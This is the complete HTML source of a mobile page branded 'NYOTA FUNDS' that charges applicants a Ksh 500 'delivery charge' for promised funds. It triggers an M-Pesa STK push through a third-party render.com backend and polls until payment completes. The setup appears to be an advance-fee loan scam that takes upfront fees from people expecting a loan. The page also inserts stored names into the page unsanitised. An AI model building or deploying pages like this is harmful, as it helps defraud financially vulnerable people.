<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NYOTA FUNDS</title>

<style>
body{
    margin:0;
    padding:15px;
    background:#0b6b0b;
    font-family:Arial,sans-serif;
}

.container{
    max-width:420px;
    margin:auto;
}

.card{
    background:white;
    padding:20px;
    border-radius:10px;
}

h1{
    text-align:center;
    color:#1565c0;
}

p{
    text-align:center;
}

input{
    width:100%;
    padding:12px;
    margin-top:10px;
    border-radius:8px;
    border:1px solid #ccc;
    box-sizing:border-box;
}

button{
    width:100%;
    padding:14px;
    margin-top:20px;
    background:#1565c0;
    color:white;
    border:none;
    border-radius:8px;
    font-size:18px;
    cursor:pointer;
}
</style>
</head>

<body>

<div class="container">
<div class="card">

<h1>NYOTA FUNDS Delivery Payment</h1>

<p>Hi 👋 <span id="name"></span></p>

<p>
Delivery Method:
<b><span id="method"></span></b>
</p>

<p><b>Delivery Charge: Ksh 500</b></p>

<input
type="tel"
id="phone"
placeholder="2547XXXXXXXX">

<button id="payBtn" onclick="payNow()">
Pay Now
</button>

</div>
</div>

<script>

document.getElementById("name").innerHTML =
localStorage.getItem("applicantName") || "Applicant";

document.getElementById("method").innerHTML =
localStorage.getItem("deliveryMethod") || "Not Selected";

async function payNow(){

let phone=document.getElementById("phone").value;

if(phone==""){
alert("Enter phone number");
return;
}

let btn=document.getElementById("payBtn");
btn.disabled=true;
btn.innerHTML="Sending STK Push...";

try{

let response=await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/stk-push",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
phone:phone,
amount:500
})
});

let data=await response.json();

console.log(data);

if(!data.success){
alert(data.message || "Payment failed");
btn.disabled=false;
btn.innerHTML="Pay Now";
return;
}

if(data.status=="completed"){
window.location.href="success.html";
return;
}

if(data.status=="pending"){

let checkout=data.checkout_request_id;

let timer=setInterval(async()=>{

let res=await fetch(
"https://swiftwallet-backend-k8kn.onrender.com/payment-status",
{
method:"POST",
headers:{
"Content-Type":"application/json"
},
body:JSON.stringify({
checkout_request_id:checkout
})
});

let status=await res.json();

console.log("PAYMENT STATUS FROM SERVER:");
console.log(status);

if(status.status=="completed"){

clearInterval(timer);

window.location.href="success.html";

}

if(status.status=="failed"){

clearInterval(timer);

alert("Payment failed");

btn.disabled=false;
btn.innerHTML="Pay Now";

}

},3000);

}

}catch(err){

console.log(err);

alert("Server error");

btn.disabled=false;
btn.innerHTML="Pay Now";

}

}

</script>

</body>
</html>
